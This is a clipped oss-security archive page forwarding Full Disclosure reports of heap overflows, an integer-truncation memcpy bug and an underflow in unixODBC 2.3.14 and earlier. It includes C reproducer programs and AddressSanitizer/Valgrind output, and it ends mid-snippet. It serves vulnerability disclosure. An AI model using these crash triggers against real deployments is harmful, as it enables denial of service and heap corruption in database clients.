---
title: "Fwd: 3 unixODBC<=2.3.14 issues from fulldisclosure mailing list"
source: https://seclists.org/oss-sec/2026/q4/520
source_host: seclists.org
clip_date: 2026-11-06T08:25:30+08:00
trace_id: ce0b89f8-80f0-4dea-9438-b6ba9a3da5a2
content_hash: 28f7dec50ed1c9c4136ce390cc3d8dd9f13a0fccfc3108587c1a1367b4f8cb3d
status: synced
tags:
  - 漏洞分析
  - 内存安全
series: null
feed_source: oss-security·漏洞披露
ai_summary: unixODBC ≤2.3.14 存在多处内存安全缺陷：64 位长度窄化截断可触发越界 memcpy，另有多个堆溢出/下溢/越读及连接池数据竞争、double-free 竞态。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41075244-d011-81ef-9703-de6b7927f767
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> unixODBC ≤2.3.14 存在多处内存安全缺陷：64 位长度窄化截断可触发越界 memcpy，另有多个堆溢出/下溢/越读及连接池数据竞争、double-free 竞态。
> 
> - **截断致越界拷贝：** `CLBindCol` 将 64 位 SQLLEN `buffer_length` 窄化为 32 位 int（如 0x180000000 → -2147483648），既跳过 `malloc` 守卫使 `local_buffer` 保持 NULL，又经符号扩展变成近 SIZE_MAX 的 `bound_length`；`SQLFetch`/`SQLExtendedFetch` 随后执行无条件 memcpy 立即崩溃，且损坏值存入长期句柄状态，后续每次 fetch 均受影响。
> - **堆溢出簇：** 开启追踪时 `SQLExecDirect` 用调用方负值 `text_length` 分配小缓冲，sprintf 把负精度当作“无精度”执行无界 `%s` 拷贝（`SQLPrepare` 有同样复制粘贴的缺陷）；`ODBCINSTAddProperty` 用 strcpy 复制无任何长度检查的属性名/值；模板驱动与 MiniSQL 的 `SQLConnect` 在长度校验之前就 sprintf 溢出 1024 字节的 `szSqlMsg`。
> - **下溢与越读：** libltdl `foreach_dirinpath` 遇到零长度路径分量（如 `LTDL_LIBRARY_PATH` 以裸冒号结尾）时 `lendir-1` 回绕为 SIZE_MAX，读到分配块前 1 字节，该路径经 `SQLConnect`/`SQLDriverConnect` 解析无路径的 `DRIVER=` 值触发；`SQLConnectW` 在指定 SQL_NTS 时按目的缓冲固定长度而非源串实际长度做 Unicode→ANSI 转换，造成定长越读。
> - **并发缺陷：** 连接池全局变量（`pooling_enabled`、`pool_max_size`、`pool_wait_timeout`）在多处读写均不加锁（现有互斥锁未被使用），共发现 7 处数据竞争；`__release_env` 等清理函数在验证后释放 `mutex_lists` 再 memset+free，两线程并发 `SQLFreeHandle` 同一句柄可导致 double-free 或 use-after-free。
> - **影响与面：** 可造成拒绝服务、跨连接共享堆损坏、信息泄露乃至任意代码执行；报告称仅粗略浏览代码即发现至少 8 处堆溢出，代码库中还存在整数下溢、空指针解引用、栈溢出等更多未展开的问题。

## oss-sec mailing list archives

## Fwd: 3 unixODBC<=2.3.14 issues from fulldisclosure mailing list

* * *

*From*: Alan Coopersmith <alan.coopersmith () oracle com>  
*Date*: Thu, 5 Nov 2026 10:15:41 -0800  

* * *

```
-------- Forwarded Message --------
```

Subject: \[FD\] unixODBC <=2.3.14 Rude Truncation via Narrowing Conversion Causes Out-of-Bounds \`memcpy\`

```
Date:   Wed, 4 Nov 2026 13:44:12 +0000
From:   Daniel Owens via Fulldisclosure <fulldisclosure () seclists org>
Reply-To:       Daniel Owens <dowens () arescorporation com>
To:     fulldisclosure () seclists org <fulldisclosure () seclists org>
```

unixODBC versions <=2.3.14 contain a rude truncation of a 64-bit \`SQLLEN\` \`buffer\_length\` to a 32-bit \`int\` without verifying that it produces a valid, positive value. The result is later passed to \`memcpy\`, causing the information system to crash or, if carefully chosen, enabling attackers to write adjacent memory under certain circumstances (e.g., a buffer length that wraps to a small positive integer or triggers an undersized allocation but otherwise passes normal validation). Notably, multiple instances like this were found in the code and this should merely serve as an example from which others may be found.

```
Examples
`get_bound_length`
```

\`CLBindCol\` accepts a 64-bit value, \`buffer\_length\` and then passes said value to \`get\_bound\_length\`, which determines the length either based on known column type lengths (e.g., \`SQL\_C\_SHORT\`, which has a value of \`2\`) or a narrowed and, thus, rudely truncated \`buffer\_length\` called \`len\` in \`get\_bound\_length\`. Once a value such as \`0x180000000\` (6,442,450,944) is supplied, \`get\_bound\_length()\`'s implicit 64-bit-to-32-bit narrowing yields \`-2147483648\`, which both disables the \`malloc\` guard that would otherwise allocate \`local\_buffer\` and is sign-extended back into the 64-bit \`bound\_length\` field, where it is subsequently reinterpreted as an enormous unsigned size. The very next fetch on that statement -- \`SQLFetch\`, \`SQLFetchScroll\`, or \`SQLExtendedFetch\` -- reaches \`fetch\_row()\`'s unconditional \`memcpy(cbuf->local_buffer, cl_statement->rowset_buffer + cbuf->rs_buffer_offset, cbuf->bound_length)\`, which both writes through the \`NULL\` \`local\_buffer\` and treats the corrupted \`bound\_length\` as a near-\`SIZE\_MAX\` copy length, crashing the process immediately. As the corrupted length is committed into long-lived, per-column state rather than discarded, every subsequent fetch on that bound column remains affected, and the same \`bound\_length\` field also feeds a second, similarly unconditional \`memcpy()\` that copies data back into the application's own real buffer, so a different combination of length value, heap layout, or \`local\_buffer\` contents will result in different impacts. The snippets below only demonstrate one such pathway -- the explanation above should set the expectations for the others.

````objectivec
```c
/** Lines 108-171 **/
static int get_bound_length( int target_type, int len )
{
     switch( target_type )
     {
       case SQL_C_STINYINT:
       case SQL_C_UTINYINT:
       case SQL_C_TINYINT:
         return 1;

       case SQL_C_SBIGINT:
       case SQL_C_UBIGINT:
         return 8;

       case SQL_C_SSHORT:
       case SQL_C_USHORT:
       case SQL_C_SHORT:
         return 2;

       case SQL_C_SLONG:
       case SQL_C_ULONG:
                   case SQL_C_LONG:
         return 4;

       case SQL_C_DOUBLE:
         return 8;

       case SQL_C_FLOAT:
         return 4;

       case SQL_C_NUMERIC:
         return sizeof( SQL_NUMERIC_STRUCT );

       case SQL_C_TYPE_DATE:
       case SQL_C_DATE:
         return sizeof( SQL_DATE_STRUCT );

       case SQL_C_TYPE_TIME:
       case SQL_C_TIME:
         return sizeof( SQL_TIME_STRUCT );

       case SQL_C_TYPE_TIMESTAMP:
       case SQL_C_TIMESTAMP:
         return sizeof( SQL_TIMESTAMP_STRUCT );

       case SQL_C_INTERVAL_YEAR:
       case SQL_C_INTERVAL_MONTH:
       case SQL_C_INTERVAL_DAY:
       case SQL_C_INTERVAL_HOUR:
       case SQL_C_INTERVAL_MINUTE:
       case SQL_C_INTERVAL_SECOND:
       case SQL_C_INTERVAL_YEAR_TO_MONTH:
       case SQL_C_INTERVAL_DAY_TO_HOUR:
       case SQL_C_INTERVAL_DAY_TO_MINUTE:
       case SQL_C_INTERVAL_DAY_TO_SECOND:
       case SQL_C_INTERVAL_HOUR_TO_MINUTE:
       case SQL_C_INTERVAL_HOUR_TO_SECOND:
       case SQL_C_INTERVAL_MINUTE_TO_SECOND:
         return sizeof( SQL_INTERVAL_STRUCT );

       default:
         return len;
     }

}
/** ... **/
/** Lines 173-194 **/
SQLRETURN CLBindCol( SQLHSTMT statement_handle,
                                    SQLUSMALLINT column_number,
            SQLSMALLINT target_type,
                                    SQLPOINTER target_value,
            SQLLEN buffer_length,
                                    SQLLEN *strlen_or_ind )
{
     CLHSTMT cl_statement = (CLHSTMT) statement_handle;
     CLBCOL *bcol;
     int b_len;
     SQLRETURN ret;

                 if ( cl_statement -> not_from_select )
                 {
                                 return  SQLBINDCOL( cl_statement -> cl_connection,
                                                 cl_statement -> driver_stmt,
                                                 column_number,
                                                 target_type,
                                                 target_value,
                                                 buffer_length,
                                                 strlen_or_ind );
                 }
/** ... **/
/** Lines 269-297 **/
     /*
      * find length
      */

     b_len = get_bound_length( target_type, buffer_length );

     if ( bcol -> local_buffer )
     {
         free( bcol -> local_buffer );
     }
     bcol -> local_buffer = NULL;

     if ( target_value && b_len > 0 )
     {
         bcol -> local_buffer = malloc( b_len );
         if ( !bcol -> local_buffer )
         {
````

cl_statement -> cl_connection -> dh.\__post_internal_error( &cl_statement -> dm_statement -> error,

````go
ERROR_HY001, NULL,
                     cl_statement -> dm_statement -> connection ->
                         environment -> requested_version );

             return SQL_ERROR;
         }
     }

     bcol -> bound_buffer = target_value;
     bcol -> bound_length = b_len;
     bcol -> bound_type = target_type;
```
Code snippets from `unixODBC`'s cur/SQLBindCol.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Matches unixODBC's own typedef on a standard 64-bit Linux/Unix build
* (include/sqltypes.h: `#if (SIZEOF_LONG_INT == 8) ... typedef long SQLLEN;`). */
typedef long SQLLEN;

#define SQL_C_CHAR 1

/* Reproduces cur/SQLBindCol.c's get_bound_length() verbatim: the function
* signature takes a 32-bit int, so any 64-bit SQLLEN the caller passes in
* is truncated at the call boundary before this function body even runs. */
static int get_bound_length( int target_type, int len )
{
     switch ( target_type )
     {
         default:
             return len;   /* cur/SQLBindCol.c:168 */
     }
}

int main( void )
{
````

char \*target_value = malloc( 64 ); /\* a real, non-NULL application buffer \*/

```
void   *local_buffer  = NULL;                    /* cur/SQLBindCol.c:279 */
SQLLEN  bound_length;
```

SQLLEN buffer_length = (SQLLEN) 0x180000000L; /\* 6,442,450,944: a valid 64-bit SQLLEN \*/

```cpp
int     b_len;
char    rowset_buffer[ 64 ];

memset( target_value, 'X', 64 );
memset( rowset_buffer, 'R', sizeof( rowset_buffer ) );
```

/\* cur/SQLBindCol.c:273 -- b_len = get_bound_length( target_type, buffer_length ); \*/

```
b_len = get_bound_length( SQL_C_CHAR, buffer_length );
printf( "buffer_length (SQLLEN, 8 bytes) = 0x%lx\n", (long) buffer_length );
printf( "b_len (int, 4 bytes, truncated)  = %d\n", b_len );
```

/\* cur/SQLBindCol.c:281-293 -- if ( target_value && b_len > 0 ) { local_buffer = malloc( b_len );... } \*/

```
if ( target_value && b_len > 0 )
{
    local_buffer = malloc( (size_t) b_len );
}
```

/\* cur/SQLBindCol.c:295-296 -- bound_buffer = target_value; bound_length = b_len; (unconditional) \*/

```
bound_length = (SQLLEN) b_len;

printf( "local_buffer = %p (expect NULL)\n", local_buffer );
printf( "bound_length = %ld (expect negative)\n", (long) bound_length );
```

/\* cur/SQLExtendedFetch.c:181 -- memcpy( cbuf->local_buffer, rowset_buffer \+ offset, cbuf->bound_length ); \*/

````cpp
printf( "calling memcpy( local_buffer, rowset_buffer, bound_length )...\n" );
     fflush( stdout );
     memcpy( local_buffer, rowset_buffer, (size_t) bound_length );

     printf( "unreachable: memcpy did not crash\n" );
     return 0;
}
```
Sample code to cause the crash

```text
````

\[\*\] calling REAL CLBindCol() with buffer_length=0x180000000 (6442450944), target_type=SQL_C_CHAR, column_number=0

```
[*] CLBindCol returned 0
[*] bcol->local_buffer = (nil)  (expect NULL)
[*] bcol->bound_buffer = 0x7f8c0cf00170  (expect == buf = 0x7f8c0cf00170)
```

\[\*\] bcol->bound_length = -2147483648 (0xffffffff80000000) (expect negative: truncated 0x180000000 -> -2147483648 sign-extended) \[+\] truncation CONFIRMED dynamically: get_bound_length() truncated the 64-bit SQLLEN to a negative 32-bit value, the malloc() guard was skipped (local_buffer stayed NULL), and the corrupted negative value was still committed into bound_length.

```rust
[*] calling REAL fetch_row(stmt, 0, -1) -- this will hit SQLExtendedFetch.c's:
         memcpy( cbuf -> local_buffer /*NULL*/,
                 rowset_buffer + rs_buffer_offset /*valid*/,
                 cbuf -> bound_length /*huge, from negative*/ );
```

SQLExtendedFetch.c:181:21: runtime error: null pointer passed as argument 1, which is declared to never be null

```
/usr/include/string.h:44:28: note: nonnull attribute specified here
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior SQLExtendedFetch.c:181:21 in
=================================================================
```

\==1412362==ERROR: AddressSanitizer: memcpy-param-overlap: memory ranges \[0x000000000000,0xffffffff80000000) and \[0x606000000020, 0x605f80000020) overlap

```
#0 ... in __asan_memcpy
     #1 0x4e1e4e in fetch_row .../SQLExtendedFetch.c:181:13
     #2 0x4df0c2 in main .../repro.c:140:11
     ...
MALICIOUS_EXIT=1
```

Address 0x000000000000 is a wild pointer inside of access range of size 0xffffffff80000000.

````
```
Output from AddressSanitizer and UndefinedBehaviorSanitizer
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/

-------- Forwarded Message --------
````

Subject: \[FD\] unixODBC <=2.3.14 Multiple Heap Buffer Overflows, Underflows, and Over-Reads

```
Date:   Wed, 4 Nov 2026 00:40:34 +0000
From:   Daniel Owens via Fulldisclosure <fulldisclosure () seclists org>
Reply-To:       Daniel Owens <dowens () arescorporation com>
To:     fulldisclosure () seclists org <fulldisclosure () seclists org>
```

unixODBC versions 2.3.14 and below contain multiple heap buffer overflows, underflows, and over-reads. Attackers who can influence various arguments passed thereto can trigger the heap-based buffer overflows inside of the unixODBC driver manager itself, potentially corrupting the shared heap state across connections, crash the driver manager (thereby causing denial of service conditions, multi-tenant data loss, and such related issues, depending on how the calling information system leverages the library and is architected), information disclosure, and execute arbitrary code, among other things. Importantly, the unixODBC was also found to contain race conditions, integer underflows, double-free/use-after-free, null pointer dereference, stack buffer overflows, and numerous other issues. We may or may not write those issues up, but this was all from a cursory glance through the code.

```
Examples
Sample Heap Buffer Overflows
```

While at least 8 different heap-based buffer overflows were discovered, the following serves as a blueprint to find both the examples below and other instances.

```
SQLExecDirect's Unvalidated Caller-Supplied Length
```

When call tracing is enabled, \`SQLExecDirect\` allocates its trace-log buffer using the caller-supplied \`text\_length\`, doing so before verifying that the value is valid. Attackers that pass a negative, non-\`SQL\_NTS\` value, as such, cause a negative value to be sent to the \`sprintf\` call, which standard C treats as "no precision given", turning the call into an unbounded \`%s\` of the full, attacker-controlled \`statement\_text\` string, overflowing the buffer. Importantly, this same mistake is made elsewhere, such as in \`SQLPrepare\`'s lines 185-189 which appears to be a copy-paste of the offending code.

````swift
```c
SQLRETURN SQLExecDirect( SQLHSTMT statement_handle,
            SQLCHAR *statement_text,
            SQLINTEGER text_length )
{
     DMHSTMT statement = (DMHSTMT) statement_handle;
     SQLRETURN ret;
     SQLCHAR *s1;
     SQLCHAR s2[ 100 + LOG_MESSAGE_LEN ];

     /*
      * check statement
      */

     if ( !__validate_stmt( statement ))
     {
         dm_log_write( __FILE__,
                     __LINE__,
                     LOG_INFO,
                     LOG_INFO,
                     "Error: SQL_INVALID_HANDLE" );

         return SQL_INVALID_HANDLE;
     }

     function_entry( statement );

     if ( log_info.log_flag )
     {
         /*
          * allocate some space for the buffer
          */

         if ( statement_text && text_length == SQL_NTS )
         {
             s1 = malloc( strlen((char*) statement_text ) + LOG_MESSAGE_LEN );
         }
         else if ( statement_text )
         {
             s1 = malloc( text_length + LOG_MESSAGE_LEN );
         }
         else
         {
             s1 = malloc( LOG_MESSAGE_LEN );
         }

         sprintf( statement -> msg, "\n\t\tEntry:\
\n\t\t\tStatement = %p\
\n\t\t\tSQL = %s",
                 statement,
                 __string_with_length( s1, statement_text, text_length ));

         free( s1 );

         dm_log_write( __FILE__,
                 __LINE__,
                 LOG_INFO,
                 LOG_INFO,
                 statement -> msg );
     }
```
Snippet from `unixODBC`'s DriverManager/SQLExecDirect.c, lines 184-242

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sql.h>
#include <sqlext.h>

int main(void)
{
     SQLHENV henv = SQL_NULL_HENV;
     SQLHDBC hdbc = SQL_NULL_HDBC;
     SQLHSTMT hstmt = SQL_NULL_HSTMT;
     SQLRETURN rc;

     SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &henv);
     SQLSetEnvAttr(henv, SQL_ATTR_ODBC_VERSION, (SQLPOINTER)SQL_OV_ODBC3, 0);
     SQLAllocHandle(SQL_HANDLE_DBC, henv, &hdbc);

     /* Enable the tracing */
     SQLSetConnectAttr(hdbc, SQL_ATTR_TRACE, (SQLPOINTER)SQL_OPT_TRACE_ON, 0);

     /* Connect so that a valid STMT handle can be allocated -- the
      * overflow itself happens before any call reaches the driver. */
     rc = SQLConnect(hdbc, (SQLCHAR*)"test", SQL_NTS,
                      (SQLCHAR*)"", SQL_NTS, (SQLCHAR*)"", SQL_NTS);
     if (!SQL_SUCCEEDED(rc) && rc != SQL_SUCCESS_WITH_INFO) { return 2; }
     SQLAllocHandle(SQL_HANDLE_STMT, hdbc, &hstmt);

     /* Long, fully attacker-controlled SQL text. */
     size_t biglen = 8192;
     char *big_sql = malloc(biglen + 1);
     memset(big_sql, 'A', biglen);
     big_sql[biglen] = '\0';

     /* Negative text_length != SQL_NTS(-3) -> malloc(-50+128)=78
      * bytes, then __string_with_length's sprintf("%.*s", -50, ...)
      * treats the negative precision as "no precision", copying the
      * full 8192-byte string into the 78-byte buffer. */
     SQLExecDirect(hstmt, (SQLCHAR*)big_sql, -50);

     free(big_sql);
     return 0;
}
```
Sample code to overflow the buffer

```text
SQLAllocHandle(ENV) rc=0
SQLAllocHandle(DBC) rc=0
SQLSetConnectAttr(SQL_ATTR_TRACE, ON) rc=0
SQLConnect("test") rc=0
SQLAllocHandle(STMT) rc=0
Calling SQLExecDirect with text_length=-50, statement_text len=8192
=================================================================
````

\==1301501==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x607000001f0e at pc 0x000000440c43 bp 0x7ffeee29bc20 sp 0x7ffeee29b3c0

```
WRITE of size 8209 at 0x607000001f0e thread T0
     #0 0x440c42 in __interceptor_vsprintf ...
     #1 0x441c37 in sprintf ...
     #2 0x7fa07e8ac894 in __string_with_length DriverManager/__info.c
     #3 0x7fa07e7ba507 in SQLExecDirect DriverManager/SQLExecDirect.c:235:17
     #4 0x4dedd9 in main repro.c:87:10
...
```

0x607000001f0e is located 0 bytes to the right of 78-byte region \[0x607000001ec0,0x607000001f0e)

````
allocated by thread T0 here:
     #0 0x4a3492 in __interceptor_malloc ...
     #1 0x7fa07e7ba4d1 in SQLExecDirect DriverManager/SQLExecDirect.c
     #2 0x4dedd9 in main repro.c:87:10
...
SUMMARY: AddressSanitizer: heap-buffer-overflow ... in __interceptor_vsprintf
==1301501==ABORTING
```
Output from AddressSanitizer

```text
==1301663== Invalid write of size 8
==1301663==    at 0x4854166: mempcpy (vg_replace_strmem.c:1668)
==1301663==    by 0x49843F7: _IO_default_xsputn (in /usr/lib64/libc.so.6)
==1301663==    by 0x4960212: __vfprintf_internal (in /usr/lib64/libc.so.6)
==1301663==    by 0x4978C23: __vsprintf_internal (in /usr/lib64/libc.so.6)
==1301663==    by 0x495AFC7: sprintf (in /usr/lib64/libc.so.6)
==1301663==    by 0x48BA2E5: __string_with_length (__info.c:3242)
==1301663==    by 0x487AD7B: SQLExecDirect (SQLExecDirect.c:231)
==1301663==    by 0x401404: main (repro.c:87)
````

\==1301663== Address 0x4c78db1 is 8,033 bytes inside an unallocated block of size 2,711,952 in arena "client" valgrind: m_mallocfree.c:303 (get_bszB_as_is): Assertion 'bszB_lo == bszB_hi' failed.

````
valgrind: Heap block lo/hi size mismatch: lo = 144, hi = 4702111234474983745.
```
Output from Valgrind

ODBCINSTSetProperty's Unbounded Property Name/Value Copy
````

Per the code below, \`ODBCINSTAddProperty()\` allocates a fixed-size \`ODBCINSTPROPERTY\` structure and then copies the caller-supplied \`pszProperty\` and \`pszValue\` \`char\[\]\`s into its \`szName\` and \`szValue\` fields without a \`NULL\` or length check.

````
```c
````

int ODBCINSTAddProperty( HODBCINSTPROPERTY hFirstProperty, char \*pszProperty, char \*pszValue )

```
{
     HODBCINSTPROPERTY hNew;
```

hNew \= (HODBCINSTPROPERTY)malloc( sizeof(ODBCINSTPROPERTY) );

```
memset(hNew, 0, sizeof(ODBCINSTPROPERTY));
```

hNew->nPromptType = ODBCINST_PROMPTTYPE_HIDDEN; hNew->pNext = NULL;

```
hNew->bRefresh                                                        = 0;
```

hNew->hDLL \= hFirstProperty->hDLL;

````r
hNew->pWidget                                                         = NULL;
     hNew->pszHelp                                                         = NULL;
                 hNew->aPromptData                                  = NULL;
                 strcpy(hNew->szName, pszProperty );
                 strcpy( hNew->szValue, pszValue );
```
Code from `unixODBC`'s odbcinst/ODBCINSTSetProperty.c, lines 54-68

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <odbcinstext.h>

int main(void)
{
     ODBCINSTPROPERTY head;
     char *evil;
     size_t n = 5000;             /* > INI_MAX_PROPERTY_NAME/VALUE (1000) */

     memset(&head, 0, sizeof(head));
````

strcpy(head.szName, "Driver"); /\* seed list head so AddProperty can walk pNext \*/

```cpp
head.pNext = NULL;
head.hDLL = NULL;

evil = malloc(n + 1);
memset(evil, 'A', n);
evil[n] = '\0';
```

fprintf(stderr, "calling ODBCINSTAddProperty with %zu-byte property name/value...\\n", n);

````javascript
/* pszProperty and pszValue are each 5000 bytes; hNew->szName/szValue
      * (heap, inside a malloc(sizeof(ODBCINSTPROPERTY)) chunk) are only
      * 1001 bytes each -> two separate heap overflows. */
     ODBCINSTAddProperty(&head, evil, evil);

     printf("reached end (heap likely corrupted)\n");
     free(evil);
     return 0;
}
```
Sample code to overflow the buffer

```text
calling ODBCINSTAddProperty with 5000-byte property name/value...
=================================================================
````

\==1300489==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61d000000888 at pc 0x00000048d469 bp 0x7fffcabae780 sp 0x7fffcabadf48

```
WRITE of size 5001 at 0x61d000000888 thread T0
     #0 0x48d468 in strcpy (repro_asan+0x48d468)
     #1 0x7f10d0722e05 in ODBCINSTAddProperty odbcinst/ODBCINSTSetProperty.c:67:2
     #2 0x4debdf in main repro.c:26:5
```

0x61d000000888 is located 0 bytes to the right of 2056-byte region \[0x61d000000080,0x61d000000888)

````yaml
allocated by thread T0 here:
     #0 0x4a3452 in __interceptor_malloc (repro_asan+0x4a3452)
     #1 0x7f10d0722bf5 in ODBCINSTAddProperty odbcinst/ODBCINSTSetProperty.c:58:33
     #2 0x4debdf in main repro.c:26:5
SUMMARY: AddressSanitizer: heap-buffer-overflow ... in strcpy
==1300489==ABORTING
```
Output from AddressSanitizer

```text
calling ODBCINSTAddProperty with 5000-byte property name/value...
==1300550== Invalid write of size 1
==1300550==    at 0x484C75C: strcpy (vg_replace_strmem.c:553)
==1300550==    by 0x485F2CC: ODBCINSTAddProperty (ODBCINSTSetProperty.c:67)
==1300550==    by 0x40123D: main (repro.c:26)
==1300550==  Address 0x4a94c18 is 0 bytes after a block of size 2,056 alloc'd
==1300550==    at 0x484686F: malloc (vg_replace_malloc.c:381)
==1300550==    by 0x485F231: ODBCINSTAddProperty (ODBCINSTSetProperty.c:58)
==1300550==    by 0x40123D: main (repro.c:26)
````

valgrind: m_mallocfree.c:303 (get_bszB_as_is): Assertion 'bszB_lo == bszB_hi' failed.

````
valgrind: Heap block lo/hi size mismatch: lo = 2128, hi = 4702111234474983745.
This is probably caused by your program erroneously writing past the
end of a heap block and corrupting heap metadata.
```
Output from Valgrind Memcheck

Template Driver's SQLConnect Unchecked Copy
````

The template driver provides sample/boilerplate Structured Query Language (SQL) connect code, but this code does not perform input validation against the upstream data source \`char\[\]\`, allowing an overflow on the corresponding \`sprintf\` call while creating what is supposed to be a diagnostic message pending the connection attempt. The length of the data sources (\`szDataSource\`) isn't checked until after the overflow has already occurred -- via \`( strlen((char\*) szDataSource ) > ODBC_FILENAME_MAX+INI_MAX_OBJECT_NAME\` -- but even this check is incorrect because \`szSqlMsg\` is only 1024-bytes and the maths above allows thousands more bytes than that. Importantly, the \`MiniSQL\` sample driver's \`SQLConnect\` contains the same issue caused by the same faulty ordering, logic, and lack of verification. This example and the MiniSQL example mentioned herein only really matter if the sample/boilerplate code is leveraged by a library but should be fixed since such code is supposed to aid develo

````
pers.

```c
SQLRETURN SQLConnect(        SQLHDBC        hDrvDbc,
````

SQLCHAR \*szDataSource, SQLSMALLINT nDataSourceLength, SQLCHAR \*szUID, SQLSMALLINT nUIDLength, SQLCHAR \*szPWD, SQLSMALLINT nPWDLength

```java
)
{
                 HDRVDBC          hDbc     = (HDRVDBC)hDrvDbc;
     char                   szDATABASE[INI_MAX_PROPERTY_VALUE+1];
     char                   szHOST[INI_MAX_PROPERTY_VALUE+1];
     char                   szPORT[INI_MAX_PROPERTY_VALUE+1];
     char                   szFLAG[INI_MAX_PROPERTY_VALUE+1];

     /* SANITY CHECKS */
     if( SQL_NULL_HDBC == hDbc )
                                 return SQL_INVALID_HANDLE;
```

sprintf((char\*) hDbc->szSqlMsg, "hDbc=$%08lX 3zDataSource=(%s)", (long)hDbc, szDataSource ); logPushMsg( hDbc->hLog, \__FILE\_\_, \__FILE\_\_, \__LINE\_\_, LOG_WARNING, LOG_WARNING,(char\*) hDbc->szSqlMsg );

```
if( hDbc->bConnected == 1 )
{
```

logPushMsg( hDbc->hLog, \__FILE\_\_, \__FILE\_\_, \__LINE\_\_, LOG_WARNING, LOG_WARNING, "SQL_ERROR Already connected" );

```
return SQL_ERROR;
}

if ( nDataSourceLength == SQL_NTS )
{
```

if ( strlen((char\*) szDataSource ) > ODBC_FILENAME_MAX+INI_MAX_OBJECT_NAME )

```
{
```

logPushMsg( hDbc->hLog, \__FILE\_\_, \__FILE\_\_, \__LINE\_\_, LOG_WARNING, LOG_WARNING, "SQL_ERROR Given Data Source is too long. I consider it suspect." );

```
return SQL_ERROR;
    }
}
else
{
    if ( nDataSourceLength > ODBC_FILENAME_MAX+INI_MAX_OBJECT_NAME )
    {
```

logPushMsg( hDbc->hLog, \__FILE\_\_, \__FILE\_\_, \__LINE\_\_, LOG_WARNING, LOG_WARNING, "SQL_ERROR Given Data Source is too long. I consider it suspect." );

````go
return SQL_ERROR;
         }
     }
```
Code snippet from `unixODBC`'s Drivers/template/SQLConnect.c, lines 16-59

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sql.h"
#include "sqlext.h"
#include "driver.h"

extern SQLRETURN SQLAllocConnect( HDRVENV hDrvEnv, HDRVDBC *phDbc );
extern SQLRETURN SQLConnect( HDRVDBC hDrvDbc, SQLCHAR *szDataSource,
     SQLSMALLINT cbDataSource, SQLCHAR *szUID, SQLSMALLINT cbUID,
     SQLCHAR *szAuthStr, SQLSMALLINT cbAuthStr );

int main( void )
{
     HDRVDBC hDbc = NULL;
     SQLAllocConnect( NULL, &hDbc );

     size_t len = 1999; /* > 1024-byte szSqlMsg, well under the ~5096-byte
                            length-sanity threshold the function checks
                            only AFTER the overflowing sprintf() */
     char *dsn = malloc( len + 1 );
     memset( dsn, 'A', len );
     dsn[ len ] = '\0';
````

printf( "\[repro\] calling sample-driver SQLConnect() with a %zu-byte data source name...\\n", len );

````r
SQLConnect( hDbc, (SQLCHAR *) dsn, (SQLSMALLINT) len, NULL, 0, NULL, 0 );

     free( dsn );
     return 0;
}
```
Sample code to overflow the buffer

```text
````

\[info\] DRVDBC heap block at 0x619000000580, sizeof(DRVDBC)=1088 bytes, szSqlMsg field size (LOG_MSG_MAX)=1024 bytes

```
[info] calling SQLConnect() with a 1999-byte data source name ...
```

\==1343590==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6190000009c0 at pc 0x000000440bf3 bp 0x7fffad3c7b60 sp 0x7fffad3c7300

```
WRITE of size 2034 at 0x6190000009c0 thread T0
     #0 0x440bf3 in __interceptor_vsprintf
     #1 0x440bf3 in sprintf
     #2 0x4deba7 in SQLConnect template/SQLConnect.c:35:2
     #3 0x4e0876 in main main.c:64:11
```

0x6190000009c0 is located 0 bytes to the right of 1088-byte region \[0x619000000580,0x6190000009c0)

````
allocated by thread T0 here:
     #0 0x4a358c in __interceptor_malloc
     #1 0x4df3a0 in _AllocConnect template/SQLAllocConnect.c:44:23
     #2 0x4e0876 in main main.c:64:11
SUMMARY: AddressSanitizer: heap-buffer-overflow ... in __interceptor_vsprintf
==1343590==ABORTING
```
Output from AddressSanitizer

Sample Heap Buffer Underflow
````

While there are several examples, such as in \`isql\` where a unvalidated integer is accepted from the commandline and passed straight to \`memset\` calls, we will stick with showing one due to vended code from \`libltdl\`, flowing through \`unixODBC\` because it shows a more interesting underflow that is seen less often. Specifically, \`foreach\_dirinpath()\` in \`libltdl/ltdl.c\` iterates the colon-separated components of a driver search path -- the process's user search path and then \`getenv("LTDL\_LIBRARY\_PATH")\` -- and, for each component, builds a candidate \`dir/base\_name\` into a newly allocated \`filename\` buffer. \`canonicalize\_path()\` can reduce a path component to an empty string -- for example, a path ending in a bare trailing colon, such as \`"/foo:/"\`, canonicalises to \`"/foo:"\`, while splitting that on \`:\` via \`argz\_create\_sep()\` yields a genuine zero-length entry. When \`foreach\_dirinpath()\` receives said zero-length \`dir\_name\`, \`lendir\` is \`0\` and the bounds check \`filename\[lendir \- 1\]!= '/'\` computes \`lendir - 1\` as an unsigned \`size_t\` subtraction that wraps to \`SIZE\_MAX\`, turning the array index into pointer arithmetic that reads one byte immediately before the just-allocated structure. This path is reached from ODBC's \`SQLConnect()\` and \`SQLDriverConnect()\` methods, both of which resolve a bare, path-less \`DRIVER=\` value and pass it to \`lt\_dlopen()\`, which calls \`try\_dlopen()\` -> \`find\_handle()\` -> \`foreach\_dirinpath()\` against \`LTDL\_LIBRARY\_PATH\` whenever the driver name doesn't contain a directory component. For the sake of brevity, we will skip the code snippets containing this issue and the path thereto, simply providing the steps to reproduce and the above, which anyone can trace through.

````cpp
```c
#include <stdio.h>
#include <stdlib.h>
#include <sql.h>
#include <sqlext.h>

int main(void)
{
     SQLHENV henv = SQL_NULL_HENV;
     SQLHDBC hdbc = SQL_NULL_HDBC;
     SQLCHAR outstr[1024];
     SQLSMALLINT outstrlen;
     SQLRETURN ret;

     SQLCHAR connstr[] = "DRIVER=does_not_exist_trigger.so;";

     SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &henv);
